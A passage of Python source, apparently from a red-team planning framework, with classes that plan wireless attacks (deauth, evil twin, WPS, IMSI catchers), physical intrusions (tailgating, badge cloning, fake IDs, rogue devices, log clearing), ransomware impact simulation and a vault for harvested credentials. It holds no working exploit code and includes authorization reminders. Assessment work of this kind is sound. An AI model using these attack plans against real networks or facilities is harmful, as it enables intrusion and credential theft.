   Launched: {campaign.get('launched_at', 'N/A')}

üìä RESULTS
   Emails Sent: {results['emails_sent']}
   Emails Opened: {results['emails_opened']} ({results['open_rate']}%)
   Links Clicked: {results['links_clicked']} ({results['click_rate']}%)
   Credentials Captured: {results['credentials_captured']} ({results['submit_rate']}%)
   Reported to Security: {results['reported']} ({results['report_rate']}%)

üéØ RISK ASSESSMENT
   High Risk Users: {sum(1 for u in self.vulnerable_users if u.get('risk_level') == 'high')}
   Medium Risk Users: {sum(1 for u in self.vulnerable_users if u.get('risk_level') == 'medium')}

üìã RECOMMENDATIONS
   ‚Ä¢ Conduct targeted security awareness training for vulnerable users
   ‚Ä¢ Review email security controls
   ‚Ä¢ Implement additional phishing protection measures
"""
        
        return report
        
    def get_overall_stats(self) -> Dict[str, Any]:
        """Get overall phishing statistics."""
        return {
            'total_campaigns': len(self.campaigns),
            'completed_campaigns': sum(1 for c in self.campaigns.values() if c['status'] == 'completed'),
            'total_targets': sum(len(c.get('targets', [])) for c in self.campaigns.values()),
            'vulnerable_users_identified': len(self.vulnerable_users),
            'average_click_rate': sum(r.get('click_rate', 0) for r in self.results.values()) / max(1, len(self.results)),
            'average_submit_rate': sum(r.get('submit_rate', 0) for r in self.results.values()) / max(1, len(self.results))
        }


# =============================================================================
# WIRELESS ATTACK PLANNER - WiFi and RF Attack Vectors
# =============================================================================

class WirelessAttackPlanner:
    """
    Plans and simulates wireless attack vectors.
    Covers WiFi, Bluetooth, RFID, and other RF attacks.
    """
    
    WIRELESS_TECHNIQUES = {
        'wifi': {
            'evil_twin': {'risk': 8, 'complexity': 4, 'range_meters': 100},
            'karma_attack': {'risk': 7, 'complexity': 5, 'range_meters': 100},
            'deauth_attack': {'risk': 6, 'complexity': 2, 'range_meters': 150},
            'wpa_handshake_capture': {'risk': 7, 'complexity': 4, 'range_meters': 100},
            'pmkid_capture': {'risk': 7, 'complexity': 3, 'range_meters': 100},
            'wps_pin_attack': {'risk': 6, 'complexity': 3, 'range_meters': 50},
            'rogue_ap': {'risk': 8, 'complexity': 4, 'range_meters': 100}
        },
        'bluetooth': {
            'bluejacking': {'risk': 3, 'complexity': 2, 'range_meters': 10},
            'bluesnarfing': {'risk': 7, 'complexity': 6, 'range_meters': 10},
            'bluebugging': {'risk': 8, 'complexity': 7, 'range_meters': 10},
            'ble_exploitation': {'risk': 7, 'complexity': 6, 'range_meters': 30}
        },
        'rfid': {
            'rfid_cloning': {'risk': 7, 'complexity': 5, 'range_meters': 1},
            'rfid_replay': {'risk': 6, 'complexity': 4, 'range_meters': 1},
            'long_range_rfid': {'risk': 8, 'complexity': 7, 'range_meters': 10}
        },
        'nfc': {
            'nfc_relay': {'risk': 8, 'complexity': 6, 'range_meters': 0.1},
            'nfc_eavesdrop': {'risk': 6, 'complexity': 5, 'range_meters': 1}
        },
        'cellular': {
            'imsi_catcher': {'risk': 9, 'complexity': 8, 'range_meters': 1000},
            'sms_interception': {'risk': 8, 'complexity': 8, 'range_meters': 500}
        }
    }
    
    def __init__(self):
        self.discovered_networks: List[Dict] = []
        self.attack_plans: List[Dict] = []
        self.equipment_requirements: Dict[str, List[str]] = {}
        
    def survey_wireless_environment(self, scan_results: Dict) -> Dict[str, Any]:
        """Survey wireless environment for targets."""
        survey = {
            'wifi_networks': [],
            'bluetooth_devices': [],
            'rfid_readers': [],
            'total_targets': 0
        }
        
        # Process WiFi networks
        for network in scan_results.get('wifi', []):
            wifi_info = {
                'ssid': network.get('ssid'),
                'bssid': network.get('bssid'),
                'channel': network.get('channel'),
                'signal_strength': network.get('signal', -70),
                'encryption': network.get('encryption', 'WPA2'),
                'wps_enabled': network.get('wps', False),
                'clients': network.get('clients', []),
                'attack_vectors': self._identify_wifi_vectors(network)
            }
            survey['wifi_networks'].append(wifi_info)
            self.discovered_networks.append(wifi_info)
            survey['total_targets'] += 1
            
        # Process Bluetooth devices
        for device in scan_results.get('bluetooth', []):
            bt_info = {
                'name': device.get('name'),
                'address': device.get('address'),
                'device_class': device.get('class'),
                'rssi': device.get('rssi', -50),
                'services': device.get('services', []),
                'attack_vectors': self._identify_bt_vectors(device)
            }
            survey['bluetooth_devices'].append(bt_info)
            survey['total_targets'] += 1
            
        return survey
        
    def _identify_wifi_vectors(self, network: Dict) -> List[str]:
        """Identify WiFi attack vectors."""
        vectors = []
        
        encryption = network.get('encryption', '').upper()
        
        if 'OPEN' in encryption or not encryption:
            vectors.extend(['evil_twin', 'mitm', 'packet_injection'])
        elif 'WEP' in encryption:
            vectors.extend(['wep_cracking', 'arp_replay'])
        elif 'WPA' in encryption:
            vectors.extend(['wpa_handshake_capture', 'pmkid_capture'])
            if network.get('wps'):
                vectors.append('wps_pin_attack')
                
        if network.get('clients'):
            vectors.append('deauth_attack')
            vectors.append('karma_attack')
            
        return vectors
        
    def _identify_bt_vectors(self, device: Dict) -> List[str]:
        """Identify Bluetooth attack vectors."""
        vectors = []
        
        device_class = device.get('class', '').lower()
        
        if 'phone' in device_class:
            vectors.extend(['bluesnarfing', 'bluebugging'])
        elif 'headset' in device_class or 'audio' in device_class:
            vectors.extend(['ble_exploitation'])
        elif 'keyboard' in device_class or 'mouse' in device_class:
            vectors.extend(['keystroke_injection', 'mousejack'])
            
        vectors.append('bluejacking')
        
        return vectors
        
    def plan_wireless_attack(self, target: Dict, technique: str) -> Dict[str, Any]:
        """Plan a wireless attack."""
        tech_category = None
        tech_info = None
        
        for category, techniques in self.WIRELESS_TECHNIQUES.items():
            if technique in techniques:
                tech_category = category
                tech_info = techniques[technique]
                break
                
        if not tech_info:
            return {'error': 'Unknown technique'}
            
        plan = {
            'id': f"wireless_{int(time.time())}",
            'target': target,
            'technique': technique,
            'category': tech_category,
            'risk_level': tech_info.get('risk'),
            'complexity': tech_info.get('complexity'),
            'effective_range': tech_info.get('range_meters'),
            'equipment': self._get_equipment_requirements(technique),
            'phases': self._generate_wireless_attack_phases(technique, target),
            'detection_risk': self._assess_wireless_detection(technique),
            'legal_considerations': self._get_legal_considerations(technique)
        }
        
        self.attack_plans.append(plan)
        return plan
        
    def _get_equipment_requirements(self, technique: str) -> List[str]:
        """Get equipment requirements for technique."""
        equipment = {
            'evil_twin': ['WiFi adapter (monitor mode)', 'hostapd', 'dnsmasq', 'captive portal'],
            'karma_attack': ['WiFi adapter (monitor mode)', 'hostapd-mana'],
            'deauth_attack': ['WiFi adapter (injection)', 'aireplay-ng'],
            'wpa_handshake_capture': ['WiFi adapter (monitor mode)', 'airodump-ng', 'hashcat'],
            'pmkid_capture': ['WiFi adapter (monitor mode)', 'hcxdumptool', 'hashcat'],
            'wps_pin_attack': ['WiFi adapter', 'reaver', 'bully'],
            'bluesnarfing': ['Bluetooth adapter', 'bluesnarfer', 'spooftooph'],
            'bluebugging': ['Bluetooth adapter', 'bluebugger'],
            'rfid_cloning': ['RFID reader/writer', 'Proxmark3'],
            'imsi_catcher': ['SDR (BladeRF, USRP)', 'OpenBTS', 'specialized software']
        }
        
        return equipment.get(technique, ['Specialized equipment required'])
        
    def _generate_wireless_attack_phases(self, technique: str, target: Dict) -> List[Dict]:
        """Generate attack phases for wireless attack."""
        phases = [
            {
                'phase': 1,
                'name': 'Reconnaissance',
                'activities': ['Survey wireless environment', 'Identify target characteristics', 'Position equipment'],
                'duration_minutes': 30
            }
        ]
        
        if technique in ['evil_twin', 'karma_attack', 'rogue_ap']:
            phases.extend([
                {
                    'phase': 2,
                    'name': 'Setup',
                    'activities': ['Configure rogue access point', 'Setup captive portal', 'Configure DHCP/DNS'],
                    'duration_minutes': 15
                },
                {
                    'phase': 3,
                    'name': 'Execution',
                    'activities': ['Force client disconnection', 'Wait for reconnection', 'Capture credentials'],
                    'duration_minutes': 60
                }
            ])
        elif technique in ['wpa_handshake_capture', 'pmkid_capture']:
            phases.extend([
                {
                    'phase': 2,
                    'name': 'Capture',
                    'activities': ['Start packet capture', 'Send deauth packets', 'Capture handshake'],
                    'duration_minutes': 10
                },
                {
                    'phase': 3,
                    'name': 'Cracking',
                    'activities': ['Convert capture format', 'Run hashcat/john', 'Dictionary/brute force'],
                    'duration_minutes': 'varies'
                }
            ])
            
        phases.append({
            'phase': len(phases) + 1,
            'name': 'Cleanup',
            'activities': ['Remove equipment', 'Clear logs', 'Document results'],
            'duration_minutes': 15
        })
        
        return phases
        
    def _assess_wireless_detection(self, technique: str) -> Dict[str, Any]:
        """Assess detection risk for wireless technique."""
        high_detection = ['imsi_catcher', 'deauth_attack', 'wps_pin_attack']
        medium_detection = ['evil_twin', 'wpa_handshake_capture', 'rogue_ap']
        low_detection = ['pmkid_capture', 'passive_sniffing', 'rfid_cloning']
        
        if technique in high_detection:
            risk = 'high'
            methods = ['WIDS/WIPS', 'Deauth detection', 'RF monitoring']
        elif technique in medium_detection:
            risk = 'medium'
            methods = ['Rogue AP detection', 'Client anomaly detection']
        else:
            risk = 'low'
            methods = ['Passive detection difficult']
            
        return {
            'risk_level': risk,
            'detection_methods': methods,
            'mitigation': 'Use directional antennas, minimize transmission time'
        }
        
    def _get_legal_considerations(self, technique: str) -> List[str]:
        """Get legal considerations for technique."""
        considerations = [
            "‚ö†Ô∏è Unauthorized wireless attacks are illegal in most jurisdictions",
            "üìú Obtain written authorization before testing",
            "üîí Document scope and boundaries clearly"
        ]
        
        if technique == 'imsi_catcher':
            considerations.append("üö® IMSI catchers may be illegal even with authorization")
            considerations.append("üì° FCC regulations apply to radio transmissions")
            
        if technique in ['deauth_attack', 'evil_twin']:
            considerations.append("üì∂ May affect legitimate users - minimize impact")
            
        return considerations


# =============================================================================
# PHYSICAL SECURITY PLANNER - Physical Intrusion Simulation
# =============================================================================

class PhysicalSecurityPlanner:
    """
    Plans physical security assessments and intrusion simulations.
    Covers access control bypass, social engineering, and facility penetration.
    """
    
    PHYSICAL_TECHNIQUES = {
        'access_control': {
            'tailgating': {'risk': 6, 'complexity': 2},
            'badge_cloning': {'risk': 8, 'complexity': 5},
            'lock_picking': {'risk': 7, 'complexity': 6},
            'door_bypass': {'risk': 7, 'complexity': 4},
            'emergency_exit_abuse': {'risk': 5, 'complexity': 2}
        },
        'social_engineering': {
            'impersonation': {'risk': 7, 'complexity': 4},
            'pretexting': {'risk': 6, 'complexity': 4},
            'delivery_pretext': {'risk': 6, 'complexity': 3},
            'maintenance_pretext': {'risk': 7, 'complexity': 4},
            'authority_impersonation': {'risk': 8, 'complexity': 5}
        },
        'surveillance': {
            'physical_recon': {'risk': 3, 'complexity': 2},
            'dumpster_diving': {'risk': 4, 'complexity': 2},
            'camera_mapping': {'risk': 4, 'complexity': 3},
            'guard_pattern_analysis': {'risk': 3, 'complexity': 4}
        },
        'device_deployment': {
            'usb_drop': {'risk': 7, 'complexity': 3},
            'rogue_device_plant': {'risk': 8, 'complexity': 5},
            'lan_turtle': {'risk': 8, 'complexity': 5},
            'keylogger_install': {'risk': 8, 'complexity': 4}
        }
    }
    
    def __init__(self):
        self.facility_map: Dict[str, Any] = {}
        self.access_points: List[Dict] = []
        self.vulnerability_assessment: Dict[str, Any] = {}
        self.intrusion_plans: List[Dict] = []
        
    def map_facility(self, facility_info: Dict) -> Dict[str, Any]:
        """Map facility for physical security assessment."""
        facility = {
            'name': facility_info.get('name'),
            'type': facility_info.get('type', 'office'),
            'floors': facility_info.get('floors', 1),
            'entrances': [],
            'security_measures': [],
            'sensitive_areas': [],
            'surveillance': {}
        }
        
        # Process entrances
        for entrance in facility_info.get('entrances', []):
            entrance_info = {
                'id': entrance.get('id'),
                'type': entrance.get('type', 'door'),
                'access_control': entrance.get('access_control', 'none'),
                'monitored': entrance.get('monitored', False),
                'guard_present': entrance.get('guard', False),
                'bypass_difficulty': self._assess_bypass_difficulty(entrance)
            }
            facility['entrances'].append(entrance_info)
            self.access_points.append(entrance_info)
            
        # Process security measures
        facility['security_measures'] = facility_info.get('security', [])
        
        # Process sensitive areas
        for area in facility_info.get('sensitive_areas', []):
            area_info = {
                'name': area.get('name'),
                'access_level': area.get('access_level', 'restricted'),
                'controls': area.get('controls', []),
                'value': area.get('value', 'medium')
            }
            facility['sensitive_areas'].append(area_info)
            
        # Surveillance mapping
        facility['surveillance'] = {
            'cameras': facility_info.get('cameras', 0),
            'coverage': facility_info.get('camera_coverage', 'partial'),
            'recording': facility_info.get('recording', True),
            'monitoring': facility_info.get('active_monitoring', False)
        }
        
        self.facility_map = facility
        return facility
        
    def _assess_bypass_difficulty(self, entrance: Dict) -> int:
        """Assess difficulty to bypass entrance (1-10)."""
        difficulty = 3  # Base
        
        access_control = entrance.get('access_control', 'none').lower()
        
        if 'biometric' in access_control:
            difficulty += 4
        elif 'card' in access_control or 'badge' in access_control:
            difficulty += 2
        elif 'pin' in access_control:
            difficulty += 1
            
        if entrance.get('guard'):
            difficulty += 2
            
        if entrance.get('monitored'):
            difficulty += 1
            
        if entrance.get('mantrap'):
            difficulty += 3
            
        return min(10, difficulty)
        
    def identify_vulnerabilities(self) -> Dict[str, Any]:
        """Identify physical security vulnerabilities."""
        vulns = {
            'access_control': [],
            'surveillance_gaps': [],
            'social_engineering': [],
            'process_weaknesses': []
        }
        
        # Check access points
        for ap in self.access_points:
            if ap.get('bypass_difficulty', 5) <= 4:
                vulns['access_control'].append({
                    'location': ap.get('id'),
                    'issue': 'Low bypass difficulty',
                    'severity': 'high' if ap.get('bypass_difficulty', 5) <= 2 else 'medium'
                })
                
            if not ap.get('monitored'):
                vulns['surveillance_gaps'].append({
                    'location': ap.get('id'),
                    'issue': 'Unmonitored entrance',
                    'severity': 'medium'
                })
                
        # Check surveillance
        surveillance = self.facility_map.get('surveillance', {})
        if surveillance.get('coverage') == 'partial':
            vulns['surveillance_gaps'].append({
                'location': 'facility',
                'issue': 'Partial camera coverage',
                'severity': 'medium'
            })
            
        if not surveillance.get('active_monitoring'):
            vulns['surveillance_gaps'].append({
                'location': 'security_center',
                'issue': 'No active monitoring',
                'severity': 'high'
            })
            
        # Social engineering opportunities
        security_measures = self.facility_map.get('security_measures', [])
        if 'visitor_management' not in security_measures:
            vulns['social_engineering'].append({
                'issue': 'No formal visitor management',
                'severity': 'high'
            })
            
        if 'security_awareness' not in security_measures:
            vulns['social_engineering'].append({
                'issue': 'Lack of security awareness training',
                'severity': 'medium'
            })
            
        self.vulnerability_assessment = vulns
        return vulns
        
    def plan_intrusion(self, objective: str, constraints: Dict = None) -> Dict[str, Any]:
        """Plan physical intrusion scenario."""
        constraints = constraints or {}
        
        plan = {
            'id': f"physical_{int(time.time())}",
            'objective': objective,
            'constraints': constraints,
            'entry_point': self._select_entry_point(constraints),
            'techniques': self._select_techniques(objective, constraints),
            'phases': [],
            'equipment': [],
            'personnel': [],
            'detection_risk': 'medium',
            'legal_scope': []
        }
        
        # Generate phases
        plan['phases'] = self._generate_intrusion_phases(plan)
        
        # Compile equipment
        plan['equipment'] = self._compile_equipment(plan['techniques'])
        
        # Assess overall detection risk
        plan['detection_risk'] = self._assess_overall_detection(plan)
        
        # Legal scope reminders
        plan['legal_scope'] = [
            "üìã Written authorization required from facility owner",
            "üö´ Stay within authorized areas only",
            "üìû Emergency contact for abort/issues",
            "üìù Document all activities",
            "‚ö†Ô∏è No actual damage or theft"
        ]
        
        self.intrusion_plans.append(plan)
        return plan
        
    def _select_entry_point(self, constraints: Dict) -> Dict:
        """Select best entry point based on constraints."""
        stealth_priority = constraints.get('stealth', 5)
        
        # Sort access points by bypass difficulty
        sorted_aps = sorted(self.access_points, 
                          key=lambda x: x.get('bypass_difficulty', 5))
        
        # If stealth is priority, avoid guarded entrances
        if stealth_priority > 7:
            sorted_aps = [ap for ap in sorted_aps if not ap.get('guard_present')]
            
        return sorted_aps[0] if sorted_aps else {'id': 'unknown', 'type': 'door'}
        
    def _select_techniques(self, objective: str, constraints: Dict) -> List[str]:
        """Select appropriate techniques for objective."""
        techniques = []
        
        # Based on objective
        if 'access' in objective.lower():
            techniques.extend(['tailgating', 'badge_cloning', 'impersonation'])
        elif 'device' in objective.lower():
            techniques.extend(['usb_drop', 'rogue_device_plant', 'pretexting'])
        elif 'data' in objective.lower():
            techniques.extend(['dumpster_diving', 'badge_cloning', 'pretexting'])
            
        # Apply constraints
        if constraints.get('no_technical', False):
            techniques = [t for t in techniques if t not in ['badge_cloning', 'rogue_device_plant']]
            
        return techniques[:3]  # Top 3
        
    def _generate_intrusion_phases(self, plan: Dict) -> List[Dict]:
        """Generate intrusion phases."""
        phases = [
            {
                'phase': 1,
                'name': 'Pre-Operation Reconnaissance',
                'activities': [
                    'External facility surveillance',
                    'Guard pattern observation',
                    'Peak hours identification',
                    'Dress code observation'
                ],
                'duration': '1-2 days'
            },
            {
                'phase': 2,
                'name': 'Preparation',
                'activities': [
                    'Acquire appropriate attire',
                    'Prepare cover story/pretext',
                    'Prepare equipment',
                    'Brief team members'
                ],
                'duration': '1 day'
            },
            {
                'phase': 3,
                'name': 'Entry',
                'activities': [
                    f"Approach via {plan.get('entry_point', {}).get('id', 'main entrance')}",
                    'Execute entry technique',
                    'Navigate to target area'
                ],
                'duration': '15-30 minutes'
            },
            {
                'phase': 4,
                'name': 'Objective Execution',
                'activities': [
                    f"Complete objective: {plan.get('objective')}",
                    'Document evidence',
                    'Prepare for exfiltration'
                ],
                'duration': '15-45 minutes'
            },
            {
                'phase': 5,
                'name': 'Exfiltration',
                'activities': [
                    'Exit facility',
                    'Avoid detection',
                    'Reach safe location',
                    'Confirm success'
                ],
                'duration': '10-20 minutes'
            }
        ]
        
        return phases
        
    def _compile_equipment(self, techniques: List[str]) -> List[str]:
        """Compile equipment list for techniques."""
        equipment = set()
        
        equipment_map = {
            'tailgating': ['Business attire', 'Prop items (coffee, box)'],
            'badge_cloning': ['Proxmark3', 'Blank cards', 'RFID reader'],
            'lock_picking': ['Lock pick set', 'Tension wrenches', 'Practice lock'],
            'impersonation': ['Appropriate uniform', 'Fake ID', 'Props'],
            'usb_drop': ['Prepared USB drives', 'Rubber ducky'],
            'rogue_device_plant': ['LAN turtle', 'Raspberry Pi', 'PoE injector'],
            'dumpster_diving': ['Gloves', 'Flashlight', 'Bag for documents']
        }
        
        for tech in techniques:
            equipment.update(equipment_map.get(tech, []))
            
        # Always include
        equipment.update(['Communication device', 'Camera/documentation', 'Authorization letter'])
        
        return list(equipment)
        
    def _assess_overall_detection(self, plan: Dict) -> str:
        """Assess overall detection risk."""
        techniques = plan.get('techniques', [])
        entry = plan.get('entry_point', {})
        
        risk_score = 0
        
        # Entry point risk
        if entry.get('guard_present'):
            risk_score += 3
        if entry.get('monitored'):
            risk_score += 2
            
        # Technique risk
        for tech in techniques:
            for cat, techs in self.PHYSICAL_TECHNIQUES.items():
                if tech in techs:
                    risk_score += techs[tech].get('risk', 5) / 3
                    
        if risk_score > 8:
            return 'high'
        elif risk_score > 4:
            return 'medium'
        else:
            return 'low'


# =============================================================================
# RANSOMWARE IMPACT SIMULATOR - Ransomware Scenario Modeling
# =============================================================================

class RansomwareImpactSimulator:
    """
    Simulates ransomware attack scenarios and calculates impact.
    Models encryption spread, data loss, and recovery scenarios.
    """
    
    RANSOMWARE_FAMILIES = {
        'lockbit': {
            'encryption_speed': 'very_fast',
            'lateral_movement': True,
            'data_exfil': True,
            'edr_evasion': 'high',
            'average_ransom_usd': 1500000
        },
        'blackcat': {
            'encryption_speed': 'fast',
            'lateral_movement': True,
            'data_exfil': True,
            'edr_evasion': 'high',
            'average_ransom_usd': 2000000
        },
        'revil': {
            'encryption_speed': 'fast',
            'lateral_movement': True,
            'data_exfil': True,
            'edr_evasion': 'medium',
            'average_ransom_usd': 1000000
        },
        'conti': {
            'encryption_speed': 'fast',
            'lateral_movement': True,
            'data_exfil': True,
            'edr_evasion': 'medium',
            'average_ransom_usd': 800000
        },
        'ryuk': {
            'encryption_speed': 'medium',
            'lateral_movement': True,
            'data_exfil': False,
            'edr_evasion': 'medium',
            'average_ransom_usd': 1200000
        }
    }
    
    def __init__(self):
        self.simulation_results: Dict[str, Any] = {}
        self.recovery_plans: List[Dict] = []
        self.impact_assessments: List[Dict] = []
        
    def simulate_ransomware_attack(self, config: Dict) -> Dict[str, Any]:
        """Simulate a ransomware attack scenario."""
        family = config.get('family', 'lockbit')
        family_info = self.RANSOMWARE_FAMILIES.get(family, {})
        
        entry_point = config.get('entry_point', 'phishing')
        initial_host = config.get('initial_host', 'workstation')
        network_size = config.get('network_size', 100)
        security_controls = config.get('security_controls', [])
        
        simulation = {
            'id': f"ransim_{int(time.time())}",
            'family': family,
            'entry_point': entry_point,
            'timeline': [],
            'systems_encrypted': 0,
            'data_exfiltrated_gb': 0,
            'detection_time': None,
            'containment_time': None,
            'total_impact': {}
        }
        
        # Simulate timeline
        timeline = []
        current_hour = 0
        encrypted = 0
        detected = False
        
        # Phase 1: Initial Access
        timeline.append({
            'hour': current_hour,
            'event': f'Initial access via {entry_point}',
            'systems_affected': 1
        })
        encrypted = 1
        
        # Phase 2: Internal Recon (if lateral movement)
        if family_info.get('lateral_movement'):
            current_hour += 2
            timeline.append({
                'hour': current_hour,
                'event': 'Internal reconnaissance and credential harvesting',
                'systems_affected': encrypted
            })
            
        # Phase 3: Lateral Movement
        current_hour += 4
        spread_rate = self._calculate_spread_rate(family_info, security_controls)
        
        while encrypted < network_size and current_hour < 168:  # Up to 1 week
            # Check for detection
            if not detected and self._check_detection(current_hour, security_controls):
                detected = True
                simulation['detection_time'] = current_hour
                timeline.append({
                    'hour': current_hour,
                    'event': 'Attack detected by security team',
                    'systems_affected': encrypted
                })
                break
                
            new_encrypted = min(int(encrypted * spread_rate), network_size - encrypted)
            encrypted += new_encrypted
            
            timeline.append({
                'hour': current_hour,
                'event': f'Lateral movement - {new_encrypted} new systems encrypted',
                'systems_affected': encrypted
            })
            
            current_hour += 1
            
        # Phase 4: Full encryption
        if encrypted > 0:
            timeline.append({
                'hour': current_hour,
                'event': f'Encryption complete - {encrypted} systems affected',
                'systems_affected': encrypted
            })
            
        # Data exfiltration
        if family_info.get('data_exfil'):
            exfil_gb = encrypted * random.randint(5, 50)
            simulation['data_exfiltrated_gb'] = exfil_gb
            timeline.append({
                'hour': current_hour - 2,
                'event': f'Data exfiltration - {exfil_gb}GB stolen',
                'systems_affected': encrypted
            })
            
        simulation['timeline'] = timeline
        simulation['systems_encrypted'] = encrypted
        simulation['total_impact'] = self._calculate_total_impact(
            encrypted, simulation['data_exfiltrated_gb'], family_info, config
        )
        
        self.simulation_results = simulation
        return simulation
        
    def _calculate_spread_rate(self, family_info: Dict, security_controls: List[str]) -> float:
        """Calculate lateral movement spread rate."""
        base_rate = 1.5
        
        speed = family_info.get('encryption_speed', 'medium')
        if speed == 'very_fast':
            base_rate = 2.0
        elif speed == 'fast':
            base_rate = 1.7
        elif speed == 'slow':
            base_rate = 1.2
            
        # Security controls reduce spread
        if 'network_segmentation' in security_controls:
            base_rate *= 0.5
        if 'edr' in security_controls:
            base_rate *= 0.7
        if 'privileged_access_management' in security_controls:
            base_rate *= 0.8
            
        return base_rate
        
    def _check_detection(self, hour: int, security_controls: List[str]) -> bool:
        """Check if attack would be detected at this point."""
        detection_prob = 0.01  # Base probability per hour
        
        if 'edr' in security_controls:
            detection_prob += 0.05
        if 'siem' in security_controls:
            detection_prob += 0.03
        if 'soc' in security_controls:
            detection_prob += 0.04
        if 'network_monitoring' in security_controls:
            detection_prob += 0.02
            
        # Detection more likely as attack progresses
        detection_prob *= (1 + hour * 0.01)
        
        return random.random() < detection_prob
        
    def _calculate_total_impact(self, systems: int, exfil_gb: float, 
                               family_info: Dict, config: Dict) -> Dict[str, Any]:
        """Calculate total financial and operational impact."""
        org_size = config.get('organization_size', 'medium')
        revenue = config.get('annual_revenue', 10000000)
        
        # Base costs
        ransom_demand = family_info.get('average_ransom_usd', 1000000)
        
        # Downtime costs
        downtime_days = systems / 20 + 3  # Recovery time
        daily_cost = revenue / 365 * 0.3  # 30% daily revenue loss
        downtime_cost = downtime_days * daily_cost
        
        # Recovery costs
        recovery_per_system = 5000
        recovery_cost = systems * recovery_per_system
        
        # Investigation and response
        incident_response = 50000 + systems * 500
        
        # Regulatory fines (if data exfil)
        regulatory = 0
        if exfil_gb > 0:
            regulatory = min(revenue * 0.04, 20000000)  # GDPR-like
            
        # Reputational damage
        reputational = revenue * 0.05
        
        return {
            'ransom_demand': ransom_demand,
            'downtime_cost': round(downtime_cost, 2),
            'recovery_cost': recovery_cost,
            'incident_response': incident_response,
            'regulatory_fines': round(regulatory, 2),
            'reputational_damage': round(reputational, 2),
            'total_without_ransom': round(
                downtime_cost + recovery_cost + incident_response + regulatory + reputational, 2
            ),
            'total_with_ransom': round(
                ransom_demand + downtime_cost * 0.5 + incident_response + regulatory + reputational, 2
            ),
            'recommendation': 'Do not pay ransom' if downtime_cost + recovery_cost < ransom_demand else 'Evaluate carefully'
        }
        
    def create_recovery_plan(self, simulation_id: str = None) -> Dict[str, Any]:
        """Create ransomware recovery plan."""
        sim = self.simulation_results if not simulation_id else {}
        
        plan = {
            'phases': [
                {
                    'phase': 1,
                    'name': 'Containment',
                    'duration_hours': 4,
                    'actions': [
                        'Isolate affected systems from network',
                        'Disable compromised accounts',
                        'Block C2 communication',
                        'Preserve evidence for forensics'
                    ]
                },
                {
                    'phase': 2,
                    'name': 'Eradication',
                    'duration_hours': 24,
                    'actions': [
                        'Identify all affected systems',
                        'Remove ransomware artifacts',
                        'Reset all credentials',
                        'Patch exploited vulnerabilities'
                    ]
                },
                {
                    'phase': 3,
                    'name': 'Recovery',
                    'duration_hours': 72,
                    'actions': [
                        'Restore systems from clean backups',
                        'Verify system integrity',
                        'Restore network connectivity',
                        'Test critical applications'
                    ]
                },
                {
                    'phase': 4,
                    'name': 'Post-Incident',
                    'duration_hours': 'ongoing',
                    'actions': [
                        'Conduct lessons learned',
                        'Update security controls',
                        'Enhance monitoring',
                        'Train staff on indicators'
                    ]
                }
            ],
            'backup_requirements': {
                'offline_backups': True,
                'backup_testing': 'weekly',
                'retention_period': '90 days',
                'backup_verification': True
            },
            'communication_plan': {
                'internal_notification': 'Immediate',
                'executive_briefing': 'Within 1 hour',
                'legal_notification': 'Within 4 hours',
                'regulatory_notification': 'Within 72 hours',
                'public_disclosure': 'As required by regulation'
            }
        }
        
        self.recovery_plans.append(plan)
        return plan
        
    def generate_impact_report(self) -> str:
        """Generate ransomware impact report."""
        sim = self.simulation_results
        impact = sim.get('total_impact', {})
        
        report = f"""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                    RANSOMWARE IMPACT SIMULATION                   ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

ü¶† ATTACK PROFILE
   Ransomware Family: {sim.get('family', 'Unknown')}
   Entry Point: {sim.get('entry_point', 'Unknown')}
   Systems Encrypted: {sim.get('systems_encrypted', 0)}
   Data Exfiltrated: {sim.get('data_exfiltrated_gb', 0)} GB

‚è±Ô∏è TIMELINE
   Detection Time: {sim.get('detection_time', 'Not detected')} hours
   Attack Duration: {len(sim.get('timeline', []))} events

üí∞ FINANCIAL IMPACT
   Ransom Demand: ${impact.get('ransom_demand', 0):,}
   Downtime Cost: ${impact.get('downtime_cost', 0):,.2f}
   Recovery Cost: ${impact.get('recovery_cost', 0):,}
   Incident Response: ${impact.get('incident_response', 0):,}
   Regulatory Fines: ${impact.get('regulatory_fines', 0):,.2f}
   Reputational Damage: ${impact.get('reputational_damage', 0):,.2f}

üìä TOTAL IMPACT
   Without Paying Ransom: ${impact.get('total_without_ransom', 0):,.2f}
   With Ransom Payment: ${impact.get('total_with_ransom', 0):,.2f}

üí° RECOMMENDATION: {impact.get('recommendation', 'Evaluate situation')}
"""
        
        return report


class CredentialVault:
    """Manage and track harvested credentials throughout attack chains."""
    
    def __init__(self):
        self.credentials: Dict[str, Dict[str, Any]] = {}
        self.credential_types = {
            'password': {'icon': 'üîë', 'priority': 3},
            'hash_ntlm': {'icon': 'üîê', 'priority': 4},
            'hash_md5': {'icon': '#Ô∏è‚É£', 'priority': 2},
            'hash_sha256': {'icon': '#Ô∏è‚É£', 'priority': 2},
            'api_key': {'icon': 'üîß', 'priority': 5},
            'ssh_key': {'icon': 'üóùÔ∏è', 'priority': 5},
            'certificate': {'icon': 'üìú', 'priority': 4},
            'token_jwt': {'icon': 'üé´', 'priority': 4},
            'token_session': {'icon': 'üéüÔ∏è', 'priority': 3},
            'kerberos_ticket': {'icon': 'üé™', 'priority': 5},
            'aws_key': {'icon': '‚òÅÔ∏è', 'priority': 5},
